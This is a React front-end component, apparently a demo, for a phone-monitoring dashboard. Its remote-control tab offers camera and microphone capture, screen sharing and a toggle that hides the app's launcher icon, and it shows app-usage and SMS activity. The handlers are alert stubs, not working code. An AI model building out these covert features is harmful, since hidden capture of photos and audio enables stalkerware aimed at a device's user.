import { useState } from 'react';
import { useParams, useNavigate } from 'react-router';
import { 
  ArrowLeft, 
  Battery, 
  Wifi, 
  Eye, 
  EyeOff,
  MonitorSmartphone,
  Camera,
  Mic,
  Smartphone,
  AlertCircle,
  CheckCircle,
  Clock
} from 'lucide-react';
import { Line } from 'recharts';

export function DeviceDetail() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState<'overview' | 'remote-control' | 'history'>('overview');
  const [visibilityMode, setVisibilityMode] = useState<'visible' | 'minimal'>('visible');

  const device = {
    id: deviceId,
    label: 'Galaxy S21 - Warehouse',
    model: 'Samsung Galaxy S21',
    osVersion: 'Android 13',
    battery: 87,
    network: 'WiFi',
    lastSync: '2 min ago',
    status: 'online',
  };

  const commandHistory = [
    { id: 1, command: 'Capture Photo (Front)', status: 'success', timestamp: '10:15:23 AM', duration: '2.3s' },
    { id: 2, command: 'Request Screen Share', status: 'success', timestamp: '10:10:12 AM', duration: '1.8s' },
    { id: 3, command: 'Record Microphone', status: 'success', timestamp: '09:45:33 AM', duration: '15.2s' },
    { id: 4, command: 'Vibrate Device', status: 'success', timestamp: '09:30:45 AM', duration: '0.5s' },
    { id: 5, command: 'Toggle Visibility Mode', status: 'success', timestamp: '09:15:20 AM', duration: '0.3s' },
    { id: 6, command: 'Capture Photo (Back)', status: 'failed', timestamp: '09:00:10 AM', duration: 'N/A' },
  ];

  const appUsage = [
    { name: 'WhatsApp', percentage: 35, color: 'bg-emerald-500' },
    { name: 'Chrome', percentage: 25, color: 'bg-blue-500' },
    { name: 'Instagram', percentage: 20, color: 'bg-pink-500' },
    { name: 'Gmail', percentage: 15, color: 'bg-red-500' },
    { name: 'Other', percentage: 5, color: 'bg-slate-500' },
  ];

  const handleRemoteCommand = (command: string) => {
    alert(`Sending command: ${command}\n\nThis is a demo. In production, this would trigger the Firebase command.`);
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center gap-4">
        <button
          onClick={() => navigate('/devices')}
          className="p-2 hover:bg-slate-800 rounded-lg transition-colors"
        >
          <ArrowLeft className="w-5 h-5 text-slate-400" />
        </button>
        <div className="flex-1">
          <h1 className="text-3xl font-bold text-slate-50 mb-1">{device.label}</h1>
          <p className="text-slate-400">{device.model} • {device.osVersion}</p>
        </div>
        <div className="flex items-center gap-2 px-3 py-2 bg-emerald-500/10 border border-emerald-500/20 rounded-lg">
          <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
          <span className="text-sm text-emerald-400">Online</span>
        </div>
      </div>

      {/* Quick Stats */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-emerald-500/10 rounded-lg">
              <Battery className="w-5 h-5 text-emerald-400" />
            </div>
            <div>
              <p className="text-sm text-slate-400">Battery Level</p>
              <p className="text-2xl font-bold text-slate-50">{device.battery}%</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-blue-500/10 rounded-lg">
              <Wifi className="w-5 h-5 text-blue-400" />
            </div>
            <div>
              <p className="text-sm text-slate-400">Network</p>
              <p className="text-2xl font-bold text-slate-50">{device.network}</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-purple-500/10 rounded-lg">
              <Smartphone className="w-5 h-5 text-purple-400" />
            </div>
            <div>
              <p className="text-sm text-slate-400">Device ID</p>
              <p className="text-lg font-bold text-slate-50 font-mono">{device.id}</p>
            </div>
          </div>
        </div>
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4">
          <div className="flex items-center gap-3">
            <div className="p-3 bg-amber-500/10 rounded-lg">
              <Clock className="w-5 h-5 text-amber-400" />
            </div>
            <div>
              <p className="text-sm text-slate-400">Last Sync</p>
              <p className="text-lg font-bold text-slate-50">{device.lastSync}</p>
            </div>
          </div>
        </div>
      </div>

      {/* Tabs */}
      <div className="border-b border-slate-800">
        <div className="flex gap-4">
          {(['overview', 'remote-control', 'history'] as const).map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-4 py-3 border-b-2 font-medium transition-colors capitalize ${
                activeTab === tab
                  ? 'border-indigo-500 text-indigo-400'
                  : 'border-transparent text-slate-400 hover:text-slate-200'
              }`}
            >
              {tab.replace('-', ' ')}
            </button>
          ))}
        </div>
      </div>

      {/* Tab Content */}
      {activeTab === 'overview' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* App Usage */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
            <h3 className="text-lg font-semibold text-slate-50 mb-4">App Usage Statistics</h3>
            <div className="space-y-3">
              {appUsage.map((app) => (
                <div key={app.name}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-sm text-slate-300">{app.name}</span>
                    <span className="text-sm font-medium text-slate-400">{app.percentage}%</span>
                  </div>
                  <div className="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
                    <div
                      className={`h-full ${app.color} transition-all`}
                      style={{ width: `${app.percentage}%` }}
                    />
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Background Activity */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
            <h3 className="text-lg font-semibold text-slate-50 mb-4">Recent Activity</h3>
            <div className="space-y-3">
              {[
                { time: '10:02:31 AM', event: 'WhatsApp notification received', type: 'notification' },
                { time: '10:00:15 AM', event: 'Photo captured via remote command', type: 'photo' },
                { time: '09:58:42 AM', event: 'Screen share session started', type: 'screen' },
                { time: '09:55:20 AM', event: 'SMS sent to +1 555-0123', type: 'sms' },
              ].map((activity, idx) => (
                <div key={idx} className="flex items-start gap-3 p-3 bg-slate-800/50 rounded-lg">
                  <div className="w-2 h-2 bg-indigo-500 rounded-full mt-2" />
                  <div className="flex-1">
                    <p className="text-sm text-slate-300">{activity.event}</p>
                    <p className="text-xs text-slate-500 mt-1">{activity.time}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {activeTab === 'remote-control' && (
        <div className="space-y-6">
          {/* Visibility Mode Toggle */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                {visibilityMode === 'visible' ? (
                  <Eye className="w-5 h-5 text-emerald-400" />
                ) : (
                  <EyeOff className="w-5 h-5 text-amber-400" />
                )}
                <div>
                  <h3 className="text-lg font-semibold text-slate-50">Visibility Mode</h3>
                  <p className="text-sm text-slate-400">
                    {visibilityMode === 'visible' 
                      ? 'Flutter launcher icon is visible on device'
                      : 'Flutter launcher icon is hidden from device'}
                  </p>
                </div>
              </div>
              <button
                onClick={() => {
                  setVisibilityMode(visibilityMode === 'visible' ? 'minimal' : 'visible');
                  handleRemoteCommand('Toggle Visibility Mode');
                }}
                className={`px-4 py-2 rounded-lg font-medium transition-colors ${
                  visibilityMode === 'visible'
                    ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20'
                    : 'bg-amber-500/10 text-amber-400 border border-amber-500/20 hover:bg-amber-500/20'
                }`}
              >
                {visibilityMode === 'visible' ? 'Hide Icon' : 'Show Icon'}
              </button>
            </div>
          </div>

          {/* Remote Control Actions */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
            <h3 className="text-lg font-semibold text-slate-50 mb-4">Remote Commands</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <button
                onClick={() => handleRemoteCommand('Request Screen Share')}
                className="flex items-center gap-3 p-4 bg-slate-800 border border-slate-700 hover:border-indigo-500 hover:bg-slate-800/80 rounded-lg transition-all"
              >
                <div className="p-3 bg-indigo-500/10 rounded-lg">
                  <MonitorSmartphone className="w-5 h-5 text-indigo-400" />
                </div>
                <div className="text-left">
                  <p className="font-medium text-slate-200">Screen Share</p>
                  <p className="text-xs text-slate-500">Request live view</p>
                </div>
              </button>

              <button
                onClick={() => handleRemoteCommand('Capture Photo (Front Camera)')}
                className="flex items-center gap-3 p-4 bg-slate-800 border border-slate-700 hover:border-pink-500 hover:bg-slate-800/80 rounded-lg transition-all"
              >
                <div className="p-3 bg-pink-500/10 rounded-lg">
                  <Camera className="w-5 h-5 text-pink-400" />
                </div>
                <div className="text-left">
                  <p className="font-medium text-slate-200">Front Camera</p>
                  <p className="text-xs text-slate-500">Capture photo</p>
                </div>
              </button>

              <button
                onClick={() => handleRemoteCommand('Capture Photo (Back Camera)')}
                className="flex items-center gap-3 p-4 bg-slate-800 border border-slate-700 hover:border-pink-500 hover:bg-slate-800/80 rounded-lg transition-all"
              >
                <div className="p-3 bg-pink-500/10 rounded-lg">
                  <Camera className="w-5 h-5 text-pink-400" />
                </div>
                <div className="text-left">
                  <p className="font-medium text-slate-200">Back Camera</p>
                  <p className="text-xs text-slate-500">Capture photo</p>
                </div>
              </button>

              <button
                onClick={() => handleRemoteCommand('Record Microphone')}
                className="flex items-center gap-3 p-4 bg-slate-800 border border-slate-700 hover:border-purple-500 hover:bg-slate-800/80 rounded-lg transition-all"
              >
                <div className="p-3 bg-purple-500/10 rounded-lg">
                  <Mic className="w-5 h-5 text-purple-400" />
                </div>
                <div className="text-left">
                  <p className="font-medium text-slate-200">Record Audio</p>
                  <p className="text-xs text-slate-500">Start recording</p>
                </div>
              </button>

              <button
                onClick={() => handleRemoteCommand('Vibrate Device')}
                className="flex items-center gap-3 p-4 bg-slate-800 border border-slate-700 hover:border-amber-500 hover:bg-slate-800/80 rounded-lg transition-all"
              >
                <div className="p-3 bg-amber-500/10 rounded-lg">
                  <Smartphone className="w-5 h-5 text-amber-400" />
                </div>
                <div className="text-left">
                  <p className="font-medium text-slate-200">Vibrate</p>
                  <p className="text-xs text-slate-500">Trigger vibration</p>
                </div>
              </button>
            </div>
          </div>
        </div>
      )}

      {activeTab === 'history' && (
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
          <h3 className="text-lg font-semibold text-slate-50 mb-4">Command History</h3>
          <div className="space-y-2">
            <div className="grid grid-cols-12 gap-4 px-4 py-2 text-xs font-medium text-slate-400 uppercase tracking-wider border-b border-slate-800">
              <div className="col-span-4">Command</div>
              <div className="col-span-2">Status</div>
              <div className="col-span-3">Timestamp</div>
              <div className="col-span-3">Duration</div>
            </div>
            {commandHistory.map((cmd) => (
              <div
                key={cmd.id}
                className="grid grid-cols-12 gap-4 px-4 py-3 bg-slate-800/30 hover:bg-slate-800/50 rounded-lg transition-colors"
              >
                <div className="col-span-4 text-sm text-slate-200">{cmd.command}</div>
                <div className="col-span-2">
                  {cmd.status === 'success' ? (
                    <span className="inline-flex items-center gap-1 text-xs text-emerald-400">
                      <CheckCircle className="w-3 h-3" />
                      Success
                    </span>
                  ) : (
                    <span className="inline-flex items-center gap-1 text-xs text-rose-400">
                      <AlertCircle className="w-3 h-3" />
                      Failed
                    </span>
                  )}
                </div>
                <div className="col-span-3 text-sm text-slate-400">{cmd.timestamp}</div>
                <div className="col-span-3 text-sm text-slate-400 font-mono">{cmd.duration}</div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
